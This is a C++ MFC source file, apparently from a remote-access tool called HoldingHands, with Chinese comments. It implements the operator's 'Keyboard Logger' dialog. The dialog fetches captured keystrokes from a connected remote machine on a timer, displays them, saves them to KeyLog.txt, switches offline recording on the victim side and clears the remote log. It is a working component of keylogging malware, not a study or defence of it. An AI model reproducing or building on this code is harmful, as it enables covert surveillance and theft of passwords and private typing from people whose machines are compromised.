// KeybdLogDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "KeybdLogDlg.h"
#include "afxdialogex.h"
#include "KeybdLogSrv.h"

// CKeybdLogDlg 对话框

IMPLEMENT_DYNAMIC(CKeybdLogDlg, CDialogEx)

CKeybdLogDlg::CKeybdLogDlg(CKeybdLogSrv*pHandler, CWnd* pParent /*=NULL*/)
	: CDialogEx(CKeybdLogDlg::IDD, pParent)
	, m_Interval(3),
	m_DestroyAfterDisconnect(FALSE),
	m_pHandler(pHandler),
	m_dwTimerId(0)
{
}

CKeybdLogDlg::~CKeybdLogDlg()
{
}

void CKeybdLogDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_Log);
	DDX_Text(pDX, IDC_EDIT2, m_Interval);
	DDX_Control(pDX, IDC_CHECK1, m_OfflineRecord);
}


BEGIN_MESSAGE_MAP(CKeybdLogDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_MESSAGE(WM_KEYBD_LOG_DATA,OnLogData)
	ON_MESSAGE(WM_KEYBD_LOG_ERROR, OnError)
	ON_MESSAGE(WM_KEYBD_LOG_INIT,OnLogInit)
	ON_BN_CLICKED(IDOK2, &CKeybdLogDlg::OnBnClickedOk2)
	ON_BN_CLICKED(IDOK, &CKeybdLogDlg::OnBnClickedOk)
	ON_EN_CHANGE(IDC_EDIT2, &CKeybdLogDlg::OnEnChangeEdit2)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_CHECK1, &CKeybdLogDlg::OnBnClickedCheck1)
	ON_BN_CLICKED(IDC_BUTTON1, &CKeybdLogDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CKeybdLogDlg 消息处理程序

void CKeybdLogDlg::PostNcDestroy()
{
	// TODO:  在此添加专用代码和/或调用基类

	CDialogEx::PostNcDestroy();
	if (!m_DestroyAfterDisconnect){
		delete this;
	}
}


void CKeybdLogDlg::OnClose()
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	if (m_pHandler){
		m_DestroyAfterDisconnect = TRUE;
		m_pHandler->Close();
	}
	else{
		//m_pHandler已经没了,现在只管自己就行.
		DestroyWindow();
	}
}


BOOL CKeybdLogDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	auto const peer = m_pHandler->GetPeerName();
	//设置窗口标题.
	CString Title;
	Title.Format(L"[%s] Keyboard Logger", CA2W(peer.first.c_str()).m_psz);
	SetWindowText(Title);
	//
	m_OfflineRecord.EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT2)->EnableWindow(FALSE);
	GetDlgItem(IDOK2)->EnableWindow(FALSE);
	GetDlgItem(IDOK)->EnableWindow(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常:  OCX 属性页应返回 FALSE
}

LRESULT CKeybdLogDlg::OnLogData(WPARAM wParam, LPARAM lParam)
{
	char*szLog = (char*)wParam;
	BOOL Append = lParam;
	if (!Append){
		//清空。
		m_Log.SetWindowTextW(TEXT(""));
	}
	m_Log.SetSel(-1);
	m_Log.ReplaceSel(CA2W(szLog).m_psz);
	return 0;
}


//保存日志
void CKeybdLogDlg::OnBnClickedOk2()
{
	//如果在这个函数内刚好连接断开会导致Server 崩溃.
	CFileDialog FileDlg(FALSE, L"*.txt", L"KeyLog.txt",
		OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, L"txt file(*.txt)|*.txt", this);
	if (IDOK == FileDlg.DoModal()){
		HANDLE hFile = CreateFile(FileDlg.GetPathName(), GENERIC_WRITE, NULL,
			NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CString strErr = TEXT("Save Log success!");
		if (hFile == INVALID_HANDLE_VALUE){
			strErr.Format(TEXT("CreateFile Failed With Error: %d"), GetLastError());
		}
		if (hFile != INVALID_HANDLE_VALUE){
			DWORD dwWrite = 0;
			CString strLog;
			CStringA aLog;
			m_Log.GetWindowTextW(strLog);
			aLog = strLog;
			WriteFile(hFile, aLog.GetBuffer(), aLog.GetLength(), &dwWrite, NULL);
			CloseHandle(hFile);
		}
		MessageBox(strErr);
	}
}


//获取记录
void CKeybdLogDlg::OnBnClickedOk()
{
	if (m_pHandler)
		m_pHandler->GetLogData();
}


void CKeybdLogDlg::OnCancel()
{
}


void CKeybdLogDlg::OnEnChangeEdit2()
{
	//重新设置时钟周期
	UpdateData();
	if (m_Interval == 0){
		return;
	}

	if (m_dwTimerId == 0x10086){
		KillTimer(m_dwTimerId);
		m_dwTimerId = 0;
		m_dwTimerId = SetTimer(0x10086, m_Interval * 1000, NULL);
	}
}


void CKeybdLogDlg::OnTimer(UINT_PTR nIDEvent)
{
	//
	if (m_pHandler){
		m_pHandler->GetLogData();
	}

	CDialogEx::OnTimer(nIDEvent);
}

LRESULT	CKeybdLogDlg::OnError(WPARAM wParam, LPARAM lParam)
{
	TCHAR*szError = (TCHAR*)wParam;
	MessageBox(szError, TEXT("Error"),MB_OK | MB_ICONINFORMATION);
	return 0;
}

LRESULT CKeybdLogDlg::OnLogInit(WPARAM wParam, LPARAM lParam)
{
	//设置 off line record 标记
	m_OfflineRecord.SetCheck(wParam);

	m_OfflineRecord.EnableWindow();
	GetDlgItem(IDC_EDIT2)->EnableWindow();
	GetDlgItem(IDOK2)->EnableWindow();
	GetDlgItem(IDOK)->EnableWindow();

	if (m_pHandler)
		m_pHandler->GetLogData();
	//开始定时获取数据.
	m_dwTimerId = SetTimer(0x10086, m_Interval * 1000, NULL);
	return 0;
}

void CKeybdLogDlg::OnBnClickedCheck1()
{
	//
	if (m_pHandler)
		m_pHandler->SetOfflineRecord(m_OfflineRecord.GetCheck());
}



void CKeybdLogDlg::OnBnClickedButton1()
{
	m_Log.SetWindowTextW(TEXT(""));
	if (m_pHandler)
		m_pHandler->CleanLog();
}




void CKeybdLogDlg::OnOK()
{
}
